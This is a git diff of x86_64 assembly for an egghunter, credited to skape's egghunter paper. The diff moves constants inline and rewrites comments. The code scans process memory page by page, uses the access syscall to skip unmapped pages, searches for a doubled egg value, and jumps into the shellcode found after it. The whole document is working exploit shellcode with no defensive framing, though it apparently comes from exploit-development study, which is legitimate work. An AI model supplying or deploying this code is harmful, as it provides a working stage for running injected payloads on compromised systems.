@@ -1,23 +1,8 @@
 global _start
 
-%define EGG         0x5090508f
-%define ACCESS      21
-
 ; derived from skape's paper on egghunters
-; mix of his access and sigaction examples
+; the following is a mix of his access and sigaction examples, ported to x86_64
 ; http://hick.org/code/skape/papers/egghunt-shellcode.pdf
-
-; int access(const char *pathname, int mode);
-;; rax -> 21
-;; rdi -> pointer to memory
-;; rsi -> mode (0x0)
-;; ---------- man access ----------
-;; The mode specifies the accessibility check(s) to be performed, and is
-;; either the  value  F_OK,  or  a  mask consisting of the bitwise OR of one
-;; or more of R_OK, W_OK, and X_OK.
-;; ---------- import os ----------
-;; >>> os.F_OK
-;; 0
 
 section .text
 _start:
@@ -34,21 +19,21 @@ _start:
   ; rdx -> 0x1000 -> 4096 -> PAGE_SIZE
 
 increment_page:
-  lea rdi, [rdi + rdx]              ; inc pointer by 4096 - keeping page aligned
+  lea rdi, [rdi + rdx]      ; inc pointer by 4096 - keeping page aligned
 
 increment_address:
-  push ACCESS
-  pop rax
-  syscall                   ; call access($rdi, $rsi) where rsi is 0x0
+  push 21
+  pop rax                   ; access syscall # loaded into rax
+  syscall                   ; call access($rdi, $rsi) where rsi is 0x0 and rdi is a memory address
 
   cmp al, 0xf2              ; if al contains 0xf2, EFAULT was returned (bad addr)
   je increment_page         ; continue the hunt!
 
 compare:
-  mov eax, EGG              ; store the egg for comparison
-  inc al
-  scasd                     ; compare and jump as appropriate
+  mov eax, 0x5090508f       ; store the egg for comparison, actual egg is 0x50905090
+  inc al                    ; increment the egg by one so the egg doesn't find itself
+  scasd                     ; compare first dword
   jne compare
-  scasd
+  scasd                     ; compare second dword
   jne compare
-  jmp rdi                   ; found it, execute the shellcode
+  jmp rdi                   ; found it, fire ze missiles!
